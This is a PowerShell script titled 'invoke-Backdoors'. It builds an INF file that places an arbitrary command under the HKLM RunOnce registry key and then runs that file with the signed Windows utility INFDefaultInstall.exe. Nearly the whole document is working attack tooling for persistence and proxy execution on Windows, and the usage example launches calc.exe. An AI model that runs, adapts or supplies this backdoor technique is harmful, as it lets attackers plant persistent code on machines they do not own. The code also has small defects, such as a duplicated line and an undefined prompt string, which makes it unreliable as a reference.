<#
    .Author ( Matt harr0ey )
   .Lisence BSD3 
   .Required Dependencies: None
   .Optional Dependencies: None


   .Topic 
       Launch Backdoors INFScript
    
   .Synopsis 
       invoke-Backdoors INFScript Inject 
 
   .Description 
       You Can Use This Script Powershell For Execution INFScript  Backdoors With Also Install Files .INF Script Using INFDefaultinstall.exe 
 
   .Note
        This invoke-Backdoors Needs Administrator
 
   .Example
   PS:> invoke-Backdoors -Command 'HKLM,%KEY_RUNONCE%\setup,%ADD_4%,0,"calc.exe"'



#>

function invoke-Backdoors {

    [CmdletBinding()]    

   param (
   
     [Parameter(Mandatory=$true)]
     [Parameter(Position = 0, ParameterSetName = 'Command')]
     [String]$Command
  )
 
  if ($like = $Command) {
  
      $x01 = '  [STRINGS] '
      $x02 = '  KEY_RUNONCE = "Software\Microsoft\Windows\CurrentVersion\RunOnce" '
      $x03 = '  KEY_REMOVE  = "Software\Microsoft\Windows\CurrentVersion\Uninstall" '
      $x04 = '  ADD_1 = "Powershell_Execute" '
      $x05 = '  ;; Locasised strings '
      $x06 = '  ;;; English '
      $x07 = '  ADD_3 = "PowerShell Execution" '
      $x08 = '  ADD_4 = "PowerShell:>" '
      $x09 = '   [version] '
      $x10 = '    signature="$CHICAGO$" '

      $x11 = '   [DefaultInstall] '
      $x12 = '   AddReg = Titre.Reg '

      $x13 = '   [Titre.Reg] '
      $x14 = '   HKLM,%KEY_RUNONCE%\setup,"               "%ADD_1% '
      $x15 = '   HKLM,%KEY_RUNONCE%\setup,"___________________________" '
      $x16 = '   HKLM,%KEY_RUNONCE%\setup,%ADD_3% '
      $x17 = '   HKLM,%KEY_RUNONCE%\setup,"" '
      $x18 = "   $command "
      $x19 = '   [Question] '
      $x20 = '   Prompt 	= %NEW_1% '
      $x21 = '   ButtonType = YESNO '
      $x22 = '   Title 	= %ADD_1% '

  $INFScript1  = Add-Content -Value $x01 -PassThru C:\INFInjection.INF
  $INFScript2  = Add-Content -Value $x02 -PassThru C:\INFInjection.INF 
  $INFScript3  = Add-Content -Value $x03 -PassThru C:\INFInjection.INF 
  $INFScript4  = Add-Content -Value $x03 -PassThru C:\INFInjection.INF
  
   
  $INFScript5  = Add-Content -Value $x04 -PassThru C:\INFInjection.INF 
  $INFScript6  = Add-Content -Value $x05 -PassThru C:\INFInjection.INF 
  $INFScript7  = Add-Content -Value $x06 -PassThru C:\INFInjection.INF 
  
  $INFScript8  = Add-Content -Value $x07 -PassThru C:\INFInjection.INF 
  $INFScript9  = Add-Content -Value $x08 -PassThru C:\INFInjection.INF 
  $INFScript10 = Add-Content -Value $x09 -PassThru C:\INFInjection.INF 
  
  $INFScript11 = Add-Content -Value $x10 -PassThru C:\INFInjection.INF 
  $INFScript12 = Add-Content -Value $x11 -PassThru C:\INFInjection.INF 
  
  $INFScript13 = Add-Content -Value $x12 -PassThru C:\INFInjection.INF 
  
  $INFScript14 = Add-Content -Value $x13 -PassThru C:\INFInjection.INF 
  $INFScript15 = Add-Content -Value $x14 -PassThru C:\INFInjection.INF 
  $INFScript16 = Add-Content -Value $x15 -PassThru C:\INFInjection.INF 
  $INFScript17 = Add-Content -Value $x16 -PassThru C:\INFInjection.INF   
  $INFScript18 = Add-Content -Value $x17 -PassThru C:\INFInjection.INF 
  $INFScript19 = Add-Content -Value $x18 -PassThru C:\INFInjection.INF 
  $INFScript20 = Add-Content -Value $x19 -PassThru C:\INFInjection.INF 
  $INFScript21 = Add-Content -Value $x20 -PassThru C:\INFInjection.INF 
  $INFScript23 = Add-Content -Value $x21 -PassThru C:\INFInjection.INF 
  $INFScript24 = Add-Content -Value $x22 -PassThru C:\INFInjection.INF
 }
 
          try{
            INFDefaultinstall.exe C:\INFInjection.INF
        } catch {
            throw "This Needs Admin"
        }

   }
 #
